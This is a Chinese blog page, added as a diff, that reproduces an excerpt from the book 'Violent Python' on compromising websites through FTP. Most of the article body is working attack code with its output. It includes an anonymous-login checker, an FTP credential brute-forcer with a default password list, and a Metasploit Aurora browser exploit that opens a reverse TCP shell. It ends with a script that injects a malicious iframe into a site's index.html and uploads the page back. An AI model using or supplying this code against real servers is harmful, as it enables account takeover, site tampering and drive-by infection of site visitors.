@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>
+     使用Python通过FTP进行Web渗透 - 沉默的大树 
+  </title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="shortcut icon" href="/img/favicon.png" type="image/x-icon">
+</head>
+
+<body>
+  <div id="layout">
+    <a href="#menu" id="menuLink" class="menu-link">
+      <span></span>
+    </a>
+    <div id="menu">
+      <a class="pure-menu-header" href="https://cmdtree.com">沉默的大树</a>
+      <div class="pure-menu">
+        <ul class="pure-menu-list">
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com">
+              Home</a>
+          </li>
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="/about.html">
+              </i>About</a>
+          </li>
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="/contact.html">
+              </i>Contact</a>
+          </li>
+          <!--
+              <li class="pure-menu-item">
+                <a class="pure-menu-link" href="https://cmdtree.com/index.xml">
+                  <i class="fa fa-rss fa-fw"></i>RSS</a>
+              </li> -->
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://github.com/rhatyang" target="_blank">
+              </i>GitHub</a>
+          </li>
+        </ul>
+        <ul class="pure-menu-list category-list">
+          
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com/blog/network.html">网络技术与安全
+              <span>(9)</span>
+            </a>
+          </li>
+          
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com/blog/use.html">使用笔记
+              <span>(47)</span>
+            </a>
+          </li>
+          
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com/blog/learn.html">学习笔记
+              <span>(29)</span>
+            </a>
+          </li>
+          
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com/blog/history.html">历史爱好者
+              <span>(3)</span>
+            </a>
+          </li>
+          
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com/blog/lifetime.html">晃眼一生
+              <span>(17)</span>
+            </a>
+          </li>
+          
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com/blog/linux.html">Unix/Linux
+              <span>(15)</span>
+            </a>
+          </li>
+          
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com/blog/javascript.html">JavaScript
+              <span>(36)</span>
+            </a>
+          </li>
+          
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com/blog/other.html">杂文
+              <span>(5)</span>
+            </a>
+          </li>
+          
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com/blog/review.html">观后感
+              <span>(2)</span>
+            </a>
+          </li>
+          
+          <li class="pure-menu-item">
+            <a class="pure-menu-link" href="https://cmdtree.com/blog/python.html">Python
+              <span>(2)</span>
+            </a>
+          </li>
+          
+        </ul>
+      </div>
+      <div class="menu-footer">
+        <div class="small-print copyright">
+          © 2018. All rights reserved.
+        </div>
+        <div class="small-print powered">
+          Powered by Node.js. Open Source on
+          <a href="https://github.com/rhatyang/cmdtree" target="_blank">Github</a>.
+        </div>
+        <div class="small-print">
+          所有内容根据
+          <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank">CC BY 4.0</a>
+          协议进行开源
+        </div>
+        <div class="last-updated small-print">
+          最后一次更新在：2018年3月4日
+        </div>
+      </div>
+    </div>
+    <div id="main">
+      
+<article class="content page" itemscope itemtype="http://schema.org/Blogpageing">
+  <div class="page-header">
+    <h1 class="page-title">使用Python通过FTP进行Web渗透</h1>
+    <div class="page-meta">
+      <p><time datetime="2017-10-02" itemprop="datePublished">日期：2017年10月02日</time></p>
+      <span class="post-category">分类：学习笔记</span>
+    </div>
+  </div>
+  <div class="page-content" itemprop="articleBody">
+    <blockquote>
+<p>节选自《python绝技：运用python成为顶级黑客》一书</p>
+</blockquote>
+<p>在最近的一次巨大的损害中，被称为 k985ytv 的攻击者，使用匿名和盗用的FTP 凭证，获得了 22400 个域名和 536000 被感染的页面。利用授权访问，攻击者注入 Javascript 代码，使好的首页重定向到乌克兰境内的恶意页面。一旦受感染的服务器被重定向到恶意的网站，恶意的主机将会在受害者电脑中安装假冒的防病毒软件，并窃取受害者的信用卡信息。K985ytv 的攻击取得了巨大的成功。在下面的章节中，我们将用 Python 来建立这种攻击。</p>
+<p>检查受感染服务器的 FTP 日志，我们看看到底发什么什么事。一个自动的脚本连接到目标主机以确认它是否包含一个名为 index.htm 的默认主页。接下来攻击者上传了一个新的 index.htm 页面，可能包含恶意的重定向脚本。受感染的服务器渗透利用任何访问它页面的脆弱客户机。</p>
+<pre><code class="hljs">204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] &quot;LIST / folderthis/folderthat/&quot; 226 1862
+204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] &quot;TYPE I&quot; 200 -
+204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] &quot;PASV&quot; 227 -
+204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] &quot;SIZE index.htm&quot; 213 -
+204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] &quot;RETR index.htm&quot; 226 2573
+204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] &quot;TYPE I&quot; 200 -
+204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] &quot;PASV&quot; 227 -
+204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] &quot;STORindex.htm&quot; 226 3018
+</code></pre>
+<p>为了更好的理解这种攻击的初始向量。我们简单的来谈一谈 FTP 的特点。文件传输协议 FTP 服务用户在一个基于TCP 网络的主机之间传输文件。通常情况下，用户通过用户名和密码来验证 FTP 服务。然而，一些网站提供匿名认证的能力，在这种情况下，用户提供用户名为“anonymous”，用电子邮件来代替密码。</p>
+<p>就安全而言，网站提供匿名的FTP服务器访问功能似乎很愚蠢。然而，令人惊讶的是许多网站提供这类FTP的访问如升级软件，这使得更多的软件获取软件的合法更新。我们可以利用Python的 ftplib 模块来构建一个小脚本，用来确认服务器是否允许匿名登录。函数 <code>anonLogin()</code> 接受一个主机名反汇编一个布尔值来确认主机是否允许匿名登录。为了确认这个布尔值，这个函数尝试用匿名认证生成一个FTP连接，如果成功，则返回 &quot;True&quot;，产生异常则返回 &quot;False&quot;。</p>
+<pre><code class="hljs py"><span class="hljs-comment"># coding=UTF-8</span>
+<span class="hljs-keyword">import</span> ftplib
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">anonLogin</span><span class="hljs-params">(hostname)</span>:</span>
+ <span class="hljs-keyword">try</span>:
+ ftp = ftplib.FTP(hostname)
+ ftp.login(<span class="hljs-string">'anonymous'</span>, <span class="hljs-string">'me@your.com'</span>)
+ print(<span class="hljs-string">'\n[*] '</span> + str(hostname) + <span class="hljs-string">' FTP Anonymous Logon Succeeded!'</span>)
+ ftp.quit()
+ <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
+ <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+ print(<span class="hljs-string">'\n[-] '</span> + str(hostname) + <span class="hljs-string">' FTP Anonymous Logon Failed!'</span>)
+ <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+host = <span class="hljs-string">'192.168.95.179'</span>
+anonLogin(host)
+</code></pre>
+<p>运行这个脚本，我们可以看到脆弱的目标可以匿名登陆。</p>
+<pre><code class="hljs py">attacker<span class="hljs-comment"># python anonLogin.py</span>
+[*] <span class="hljs-number">192.168</span><span class="hljs-number">.95</span><span class="hljs-number">.179</span> FTP Anonymous Logon Succeeded
+</code></pre>
+<p><strong>利用 Ftplib 暴力破解 FTP 用户认证</strong></p>
+<p>当匿名登录一路回车进入系统，攻击者也十分成功的利用偷来的证书获得合法FTP服务器的访问权限。FTP客户端程序，比如说FileZilla，经常将密码存储在配置文件中。安全专家发现，由于最近的恶意软件，FTP证书经常被偷取。此外，HD Moore甚至将 get_filezilla_creds.rb 的脚本包含到最近的Metasploit的发行版本中允许用户快速的扫描目标主机的FTP证书。想象一个我们想通过暴力破解的包含 username/password 组合的文本文件。对于这个脚本的目的，利用存贮在文本文件中的 username/password 组合</p>
+<pre><code class="hljs">administrator:password
+admin:12345
+root:secret
+guest:guest
+root:toor
+</code></pre>
+<p>现在我们能扩展前面建立的 anonLogin() 函数建立名为 brutelogin() 的函数。这个函数接受主机名和密码文件作为输入返回允许访问主机的证书。注意，函数迭代文件的每一行，用冒号分割用户名和密码，然后这个函数用用户名和密码尝试登陆FTP服务器。如果成功，将返回用户名和密码的元组，如果失败有异常，将继续测试下一行。如果遍历完所有的用户名和密码都没有成功，则返回包含 None 的元组。</p>
+<pre><code class="hljs py"><span class="hljs-comment"># coding=UTF-8</span>
+<span class="hljs-keyword">import</span> ftplib
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bruteLogin</span><span class="hljs-params">(hostname, passwdFile)</span>:</span>
+ pF = open(passwdFile, <span class="hljs-string">'r'</span>)
+ <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> pF.readlines():
+ userName = line.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">0</span>]
+ passWord = line.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">1</span>].strip(<span class="hljs-string">'\r'</span>).strip(<span class="hljs-string">'\n'</span>)
+ print(<span class="hljs-string">"[+] Trying: "</span> + userName + <span class="hljs-string">"/"</span> + passWord)
+ <span class="hljs-keyword">try</span>:
+ ftp = ftplib.FTP(hostname)
+ ftp.login(userName, passWord)
+ print(<span class="hljs-string">'\n[*] '</span> + str(hostname) + <span class="hljs-string">' FTP Logon
+Succeeded: '</span> + userName + <span class="hljs-string">"/"</span> + passWord)
+ ftp.quit()
+ <span class="hljs-keyword">return</span> (userName, passWord)
+ <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+ <span class="hljs-keyword">pass</span>
+ print(<span class="hljs-string">'\n[-] Could not brute force FTP credentials.'</span>)
+ <span class="hljs-keyword">return</span> (<span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>)
+host = <span class="hljs-string">'192.168.95.179'</span>
+passwdFile = <span class="hljs-string">'userpass.txt'</span>
+bruteLogin(host, passwdFile)
+</code></pre>
+<p>遍历用户名和密码组合，我们终于找到了用户名以及对应的密码。</p>
+<pre><code class="hljs">attacker# python bruteLogin.py
+[+] Trying: administrator/password
+[+] Trying: admin/12345
+[+] Trying: root/secret
+[+] Trying: guest/guest
+[*] 192.168.95.179 FTP Logon Succeeded: guest/guest
+</code></pre>
+<p><strong>在 FTP 服务器上寻找 WEB 页面</strong></p>
+<p>有了FTP访问权限，我们还要测试服务器是否还提供了WEB访问。为了测试这个，我们首先要列出FTP的服务目录并寻找默认的WEB页面。函数 returnDefault() 接受一个FTP连接作为输入并返回一个找到的默认页面的数组。它通过发送命令NLST列出目录内容。这个函数检查每个文件返回默认WEB页面文件名并将任何发现的默认WEB页面文件名添加到名为 retList 的列表中。完成迭代这些文件之后，函数将返回这个列表</p>
+<pre><code class="hljs py"><span class="hljs-comment"># coding=UTF-8</span>
+<span class="hljs-keyword">import</span> ftplib
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">returnDefault</span><span class="hljs-params">(ftp)</span>:</span>
+ <span class="hljs-keyword">try</span>:
+ dirList = ftp.nlst()
+ <span class="hljs-keyword">except</span>:
+ dirList = []
+ print(<span class="hljs-string">'[-] Could not list directory contents.'</span>)
+ print(<span class="hljs-string">'[-] Skipping To Next Target.'</span>)
+ <span class="hljs-keyword">return</span>
+ retList = []
+  <span class="hljs-keyword">for</span> fileName <span class="hljs-keyword">in</span> dirList:
+ fn = fileName.lower()
+ <span class="hljs-keyword">if</span> <span class="hljs-string">'.php'</span> <span class="hljs-keyword">in</span> fn <span class="hljs-keyword">or</span> <span class="hljs-string">'.htm'</span> <span class="hljs-keyword">in</span> fn <span class="hljs-keyword">or</span> <span class="hljs-string">'.asp'</span> <span class="hljs-keyword">in</span> fn:
+ print(<span class="hljs-string">'[+] Found default page: '</span> + fileName)
+ retList.append(fileName)
+ <span class="hljs-keyword">return</span> retList
+host = <span class="hljs-string">'192.168.95.179'</span>
+userName = <span class="hljs-string">'guest'</span>
+passWord = <span class="hljs-string">'guest'</span>
+ftp = ftplib.FTP(host)
+ftp.login(userName, passWord)
+returnDefault(ftp)
+</code></pre>
+<p>看着这个脆弱的FTP服务器，我们可以看到它有三个WEB页面在基目录下。好极了，我们知道可以移动我们的攻击向量到我们的被感染的页面。</p>
+<pre><code class="hljs">attacker# python defaultPages.py
+[+] Found default page: index.html
+[+] Found default page: index.php
+[+] Found default page: testmysql.php
+</code></pre>
+<p><strong>添加恶意注入脚本到 WEB 页面</strong></p>
+<p>现在我们已经找到了WEB页面文件，我们必须用一个恶意的重定向感染它。为了快速的生成一个恶意的服务器和页面在 http://10.10.10.112:8080/exploit  页面，我们将使用Metasploit框架。注意，我们选择 ms10_002_aurora的Exploit,同样的Exploit被用在攻击Google的极光行动中。位与 http://10.10.10.112:8080/exploit 的页面将重定向到受害者，这将返回给我们一个反弹的Shell。</p>
+<pre><code class="hljs">attacker# msfcli exploit/windows/browser/ms10_002_aurora
+ LHOST=10.10.10.112 SRVHOST=10.10.10.112 URIPATH=/exploit
+ PAYLOAD=windows/shell/reverse_tcp LHOST=10.10.10.112
+LPORT=443 E
+[*] Please wait while we load the module tree...
+&lt;...SNIPPED...&gt;
+LHOST =&gt; 10.10.10.112
+SRVHOST =&gt; 10.10.10.112
+URIPATH =&gt; /exploit
+PAYLOAD =&gt; windows/shell/reverse_tcp
+LHOST =&gt; 10.10.10.112
+LPORT =&gt; 443
+[*] Exploit running as background job.
+[*] Started reverse handler on 10.10.10.112:443
+[*] Using URL:http://10.10.10.112:8080/exploit
+[*] Server started.
+msf exploit(ms10_002_aurora) &gt;
+</code></pre>
+<p>任何脆弱的客户机连接到我们的服务页面 http://10.10.10.112:8080/exploit 都将会落入我们的陷阱中。如果成功，它将建立一个反向的TCP Shell并允许我们远程的在客户机上执行Windows命令。从这个命令行Shell我们能在受感染的受害者主机上以管理员权限执行命令。</p>
+<pre><code class="hljs py">msf exploit(ms10_002_aurora) &gt; [*] Sending Internet Explorer
+<span class="hljs-string">"Aurora"</span>
+ Memory Corruption to client <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.107</span>
+[*] Sending stage (<span class="hljs-number">240</span> bytes) to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.107</span>
+[*] Command shell session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.112</span>:<span class="hljs-number">443</span> -&gt;
+ <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.107</span>:<span class="hljs-number">49181</span>) at <span class="hljs-number">2012</span><span class="hljs-number">-06</span><span class="hljs-number">-24</span> <span class="hljs-number">10</span>:<span class="hljs-number">05</span>:<span class="hljs-number">10</span> <span class="hljs-number">-0600</span>
+msf exploit(ms10_002_aurora) &gt; sessions -i <span class="hljs-number">1</span>
+[*] Starting interaction <span class="hljs-keyword">with</span> <span class="hljs-number">1.</span>..
+Microsoft Windows XP [Version <span class="hljs-number">5.1</span><span class="hljs-number">.2600</span>]
+(C) Copyright <span class="hljs-number">1985</span><span class="hljs-number">-2001</span> Microsoft Corp.
+C:\Documents <span class="hljs-keyword">and</span> Settings\Administrator\Desktop&gt;
+</code></pre>
+<p>接下来，我们必须添加一个重定向从被感染的主机到我们的恶意的服务器。为此，我们可以从攻陷的服务器下载默认的WEB页面，注入一个 iframe ，然后上传恶意的页面到服务器上。看看这个  injectPage() 函数，它接受一个FTP连接，一个页面名和一个重定向的 iframe 的字符串作为输入，然后下载页面作为临时副本，接下来，添加重定向的 iframe 代码到临时文件中。最后，该函数上传这个被感染的页面到服务器中。</p>
+<pre><code class="hljs py"><span class="hljs-comment"># coding=UTF-8</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">injectPage</span><span class="hljs-params">(ftp, page, redirect)</span>:</span>
+ f = open(page + <span class="hljs-string">'.tmp'</span>, <span class="hljs-string">'w'</span>)
+ ftp.retrlines(<span class="hljs-string">'RETR '</span> + page, f.write)
+ <span class="hljs-keyword">print</span> <span class="hljs-string">'[+] Downloaded Page: '</span> + page
+ f.write(redirect)
+ f.close()
+ <span class="hljs-keyword">print</span> <span class="hljs-string">'[+] Injected Malicious IFrame on: '</span> + page
+ ftp.storlines(<span class="hljs-string">'STOR '</span> + page, open(page + <span class="hljs-string">'.tmp'</span>))
+ <span class="hljs-keyword">print</span> <span class="hljs-string">'[+] Uploaded Injected Page: '</span> + page
+host = <span class="hljs-string">'192.168.95.179'</span>
+userName = <span class="hljs-string">'guest'</span>
+passWord = <span class="hljs-string">'guest'</span>
+ftp = ftplib.FTP(host)
+ftp.login(userName, passWord)
+redirect = <span class="hljs-string">'&lt;iframe
+src="http://10.10.10.112:8080/exploit"&gt;&lt;/iframe&gt;'</span>
+injectPage(ftp, <span class="hljs-string">'index.html'</span>, redirect)
+</code></pre>
+<p>运行我们的代码，我们可以看到它下载 index.html 页面然后注入我们的恶意代码到里面。</p>
+<pre><code class="hljs">attacker# python injectPage.py
+[+] Downloaded Page: index.html
+[+] Injected Malicious IFrame on: index.html
+[+] Uploaded Injected Page: index.html 
+</code></pre>
+
+  </div>
+</article>
+
+    </div>
+  </div>
+  <script src="/js/ui.js"></script>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-113894191-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+    gtag('config', 'UA-113894191-1');
+
+  </script>
+</body>
+
+</html>
